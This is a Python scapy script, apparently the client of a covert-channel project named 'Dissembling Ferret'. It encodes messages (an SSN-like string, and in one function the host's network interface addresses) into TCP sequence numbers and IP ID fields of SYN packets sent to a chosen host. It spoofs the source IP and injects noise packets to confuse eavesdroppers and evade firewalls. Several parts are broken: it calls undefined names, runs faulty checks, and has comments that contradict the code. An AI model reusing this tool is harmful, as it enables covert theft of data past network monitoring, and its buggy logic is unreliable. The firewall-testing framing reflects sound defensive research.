#!/usr/bin/env python

'''
=======================================================================
  ___  _                  _    _ _             ___                _
 |   \(_)______ ___ _ __ | |__| (_)_ _  __ _  | __|__ _ _ _ _ ___| |_
 | |) | (_-<_-</ -_) '  \| '_ \ | | ' \/ _` | | _/ -_) '_| '_/ -_)  _|
 |___/|_/__/__/\___|_|_|_|_.__/_|_|_||_\__, | |_|\___|_| |_| \___|\__|
                                       |___/

=======================================================================

Send a message using TCP sequence numbers, ttl, window size, and perhaps
others. Inject noise into the channel to confuse eavesdroppers.

Sequence numbers have a generous size limit of 32bits.

Stego part:

The sequence numbers are converted to ASCII by dividing by 16777216 which is a
representation of 65536*256. [1] see README

TODO:
- change end-of-message indicator, win=1337
- add try, except where appropriate
- add mode [demo, live]
  demo mode will send packets immediately
  live mode will send 1 packet per second 3 times, once a minute (adjustable)???
- add bounce functionality
  i.e. bounce SYN packet off an active web server check ACK seq number
- Add dummy packet data to mimic real traffic. (should we bother?)
- Add TODOs to the issue queue on github.
- Add more tests, other than convert TCP/IP channels
- Send bad checksums (could help prevent responses to our SYN packets)
- Add a test that sends data in the data section of a packet
  - send '111223333' in one packet
  - send other messages as well, will any get flagged/blocked?

Questions:
- Why not bounce off DNS server(s) ?
- Should we cipher the seq numbers we generate in order to add a layer of
  obfuscation? So if the traffic is detected it won't be easily translated.

Notes:
A testing suite should be able to perform all tests or individual tests.
Lets start out by building the initial tests we are interested in and then run
through them all. I'll add this info to the issue queue. - Clay

Using ttl on the server side to determine how to decipher the message.
'''

# =======
# Imports
# =======

from scapy.all import *
import os
import sys
import random
import netifaces
import re
import time

#from IPy import IP # Namespace collision with scapy
import IPy
from optparse import OptionParser

parser = OptionParser()
parser.add_option ("-d", "--dest", dest="destination_ip", default="foo",
                    help="Destination IP for the hidden message")
parser.add_option ("-s", "--spoof", dest="spoof_ip", default="66.249.66.1",
                    help="Spoof the source IP address as this value")
parser.add_option ("-p", "--port", dest="dstport", default="80",
                    help="Destination port (port for Dissembling Ferret server listener)")
(options, args) = parser.parse_args()

destination = options.destination_ip
spoof = options.spoof_ip
dstport = int(options.dstport)

# Ensure we have a destination specified
if destination == "foo":
    parser.print_help()
    exit(0)

# Make sure IP addresses are real
try:
    IPy.IP(destination)
except ValueError:
    print "\nERROR: Invalid destination IP address\n"
    parser.print_help()
    exit(0)

try:
    IPy.IP(spoof)
except ValueError:
    print "\nERROR: Invalid spoof source IP address\n"
    parser.print_help()
    exit(0)

if dstport < 0 or dstport > 65535:
    print "\nERROR: Destination port number is invalid, try a number 0 to 65,535\n"
    parser.print_help()
    exit(0)


# ================
# Global variables
# ================

# Set the mode
mode = 'demo'
# mode = 'live'

thishost = os.uname()[1]
multiplier = 16777216  # the server will be performing the division

# An example sending a SSN, with the hyphens to make it look like a SSN. A
# smooth criminal may try to obfuscate the SSN.
# TEST: will a firewall detect this? should it?
#message = '111-22-3333 from ' + thishost + '\n'
message = 'foo bar 111-22-3333'
# Clear before each use. Used by initial sequence numbers and IP ID tests
exfilArray = []

# Get destination from the command-line.
#-destination = str(sys.argv[1])

# Hard-code destination
# TODO we should consider using a config for this and other testable things
#-destination = '192.168.12'

print '[+] destination: ' + destination

# When using a bounce host, the bounce host will be the destination,
# the source host will be our server.
bounce = ''
# Spoof our source
#-spoof = '66.249.66.1'  # crawl-66-249-66-1.googlebot.com
#spoof = '8.8.8.8'     # google-public-dns-a.google.com
# Get our real ip. This is especially useful in NAT'd environments.
interfaces = netifaces.interfaces()


# =========
# Functions
# =========

# TODO: Add functions to perform the various techniques to test a firewall against.

# Print usage details
#-def usage():
    #- Should we set a sensible default? e.g. 127.0.0.1 80
    #- print 'sudo ./dissferret-client.py [destination IP] [destination port]'


# Does x fit in a 16bit int?
# We need this for IPID
def is_16bit(x):
    bitl = (x).bit_length()
    if bitl <= 16:
        # print '[*] OK: int is 16bit'
        return True
    else:
        # print '[-] Warning: int is too large.'
        return False


# Does x fit in a 32bit int?
# We need this for iseq
def is_32bit(x):
    bitl = (x).bit_length()
    if bitl <= 32:
        # print '[*] OK: int is 32bit'
        return True
    else:
        # print '[-] Warning: int is too large.'
        return False


# Set the ttl=60 to indicate end-of-message
def send_eom():
    print '[*] Sending End-Of-Message'
    pkt.win = 7331
    send(pkt)


# Convert message
# Lots of options here but we're going to convert each letter of the message
# to its decimal equivalent.. which will be multiplied by the multiplier.
def convert_iseq(message):
    print '[*] converting iseq message: %s' % message
    for char in message:
        c = ord(char)
        # While we are here, might as well generate our SYN packet sequence
        # number.
        exfilChar = c * multiplier
        # Add seq to the global exfilArray.
        if is_32bit(exfilChar):
            print '[+] iseq size OK'
        else:
            print '[-] Warning: iseq int too large %d. Setting to X' % exfilChar
            # TODO: recover safely, setting to X for now
            exfilChar = ord(X) * multiplier
        exfilArray.append(exfilChar)
        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)


def convert_ipid(message):
    print '[*] converting ipid message: %s' % message
    for char in message:
        c = ord(char)
        # While we are here, might as well generate our SYN packet sequence
        # number.
        exfilChar = c * 256
        # Add to the global exfilArray.
        if is_16bit(exfilChar):
            # do nothing (refactor to if not?)
            print '[+] IPID size OK'
        else:
            print '[-] Warning: IPID int too large %d. Setting to X' % exfilChar
            # TODO: recover safely, setting to X for now
            exfilChar = ord(X) * 256
        exfilArray.append(exfilChar)
        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)


# I think single quotes are killing things
def trim_message(message):
    print '[*] trimming message'
    trimmed = []
    # Check for a valid char
    for char in message:
        # valid = re.match('^[\w-]+$', char) is not None
        invalid = re.match('^\'', char) is not None
        print '[*] invalid: %s is %s' % (char, invalid)
        # Add valid chars to trimmed
        if invalid == 'True':
            print '[*] skipping %s' % char
        else:
            trimmed.append(char)
    return trimmed


def add_n0ise_iseq(i):
    print '[*] adding n0ise to iseq..'
    y = exfilArray[i]
    # Add some randomness
    randy = random.randint(-9999999, 9999999)  # too large will produce error
    pkt.seq = y + randy
    # Signal noisy packet
    pkt.window = int(8182) - random.randint(23, 275)
    try:
        send(pkt)
    except socket.error:
        print "\nERROR: Problem sending packets, are you root?\n"
        exit(0)


def add_n0ise_ipid(i):
    print '[*] adding n0ise to IPID..'
    y = exfilArray[i]
    # Add some randomness
    randy = random.randint(-999, 999)  # too large will produce error
    pkt.seq = y + randy
    # Signal noisy packet
    pkt.window = int(8182) - random.randint(23, 275)
    try:
        send(pkt)
    except socket.error:
        print "\nERROR: Problem sending packets, are you root?\n"
        exit(0)


# In IPv4, the Identification (ID) field is a 16-bit value.
# TODO: validate value of ipid (must be a 16-bit value)
def exfil_ipid():
    print '[*] Attempting ID identification exfil..msglen', msglen
    i = 0
    for c in exfilArray:
        print '[*] count i:', i
        if i == msglen:
            print '[*] EOM'
        add_n0ise_ipid(i)
        pkt.id = exfilArray[i]
        time.sleep(0.4)
        try:
            send(pkt)
        except socket.error:
            print "\nERROR: Problem sending packets, are you root?\n"
            exit(0)
        i += 1
    send_eom()


# Send message using initial sequence numbers. Add noise.
def exfil_iseq():
    i = 0
    for c in exfilArray:
        add_n0ise_iseq(i)
        pkt.window = 1337
        pkt.seq = exfilArray[i]
        # slow our roll
        time.sleep(0.4)
        try:
            print '[window] ' + str(pkt.window)
            send(pkt)
        except socket.error:
            print "\nERROR: Problem sending packets, are you root?\n"
            exit(0)
        i += 1
    send_eom()


def exfil_bounce():
    print '[*] Attempting Ack sequence number bounce exfil..'
    i = 0
    for c in exfilArray:
        # Can we use exfil_iseq instead.. by creating the packet with the
        # appropriate header fields set?
        add_n0ise_iseq(i)
        pkt.window = 1339
        pkt.seq = exfilArray[i]
        time.sleep(0.4)
        try:
            send(pkt)
        except socket.error:
            print "\nERROR: Problem sending packets, are you root?\n"
            exit(0)
        i += 1
    send_eom()


# This function sends interface details for interfaces of interest, AF_INET
# family. This function currently uses the initial sequence number.
def send_iface():
    print '[*] interfaces: %s' % interfaces
    # Interesting in sending found en*, eth*, and wlp* interface data
    for face in interfaces:
        addrs = netifaces.ifaddresses(face)
        # Get the MAC address
        facemac = addrs[netifaces.AF_LINK]
        try:
            print face, netifaces.ifaddresses(face)[2], facemac
            # Try to display en*
            if 'en' in face or 'eth' in face or 'wlp' in face:
                print '[*] found: %s' % face
                message = str(netifaces.ifaddresses(face)[2])
                # debugging
                print '[*] New message: %s' % message
                # trimmed = trim_message(message)
                # print '[*] Trimmed message: %s' % trimmed
                convert_message(message)
                # Call the testing method we'd like to test
                # TODO: run all tests or run a specific test, specify here.
                exfil_iseq()
        except:
            # skip, do nothing
            print "[-] interface does not contain AF_INET family."


# ============
# Main program
# ============

# ==== use iseq
# Convert our original message. Later we'll update our message and send
# network interface data.
convert_iseq(message)
# How long is our message. We can use this when adding noise. If we use the
# ttl then this will be easy to crack. We might be able to create an algorithm
# that's complex enough to at least frustrate analysts.
msglen = len(exfilArray)

# Future work: adjust some fields to perhaps better emulate commonly seen traffic.
# TODO we should add dport and flags as configurable options.
# TODO add check, sys.argv[2] must be between 1-65565
#-dstport = int(sys.argv[2])
# Craft our basic packet.
pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')

# Attempt data exfiltration using initial sequence numbers
exfil_iseq()
print '[*] Sent using iseq: %s' % message

exfilArray = []  # clear before each use

# ==== use IPID
print '[*] Testing method IPID..'
pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')  # reset our packet
convert_ipid(message)
msglen = len(exfilArray)
exfil_ipid()
print '[*] Sent using IPID: %s' % message

# exfilArray = []
# ====


# ==== use bounce host
